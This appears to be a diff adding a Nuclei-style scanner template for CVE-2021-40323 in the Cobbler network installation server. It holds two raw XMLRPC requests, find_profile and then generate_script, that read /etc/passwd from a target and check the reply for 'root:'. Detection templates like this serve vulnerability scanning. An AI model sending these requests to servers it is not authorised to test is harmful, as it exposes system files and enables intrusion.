@@ -1,0 +1,90 @@
+id: CVE-2021-40323
+info:
+  name: Cobbler 3.3.0 XMLRPC cobbler_api RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Cobbler is a network installation server suite used to quickly build a Linux network installation environment. Versions prior to Cobbler 3.3.0 have a command execution vulnerability allowing attackers to execute arbitrary commands and gain server privileges.
+  reference:
+    - https://github.com/cobbler/cobbler/releases/tag/v3.3.0
+    - http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202110-145
+  classification:
+    cve-id: CVE-2021-40323
+    cvss-score: 9.8
+
+variables:
+  exploit_path: "/etc/passwd"
+
+http:
+  - id: find_profile
+    raw:
+      - |
+        POST /cobbler_api HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml
+
+        <?xml version='1.0'?>
+        <methodCall>
+          <methodName>find_profile</methodName>
+          <params>
+            <param>
+              <value>
+                <struct>
+                  <member>
+                    <name>name</name>
+                    <value>
+                      <string>*</string>
+                    </value>
+                  </member>
+                </struct>
+              </value>
+            </param>
+          </params>
+        </methodCall>
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<methodResponse>"
+    extractors:
+      - type: regex
+        name: profile_name
+        part: body
+        regex:
+          - "<value><string>(.*?)</string></value>"
+        internal: true
+
+  - id: generate_script
+    raw:
+      - |
+        POST /cobbler_api HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml
+
+        <?xml version='1.0'?>
+        <methodCall>
+          <methodName>generate_script</methodName>
+          <params>
+            <param>
+              <value>
+                <string>{{profile_name}}</string>
+              </value>
+            </param>
+            <param>
+              <value>
+                <string></string>
+              </value>
+            </param>
+            <param>
+              <value>
+                <string>{{exploit_path}}</string>
+              </value>
+            </param>
+          </params>
+        </methodCall>
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "root:"
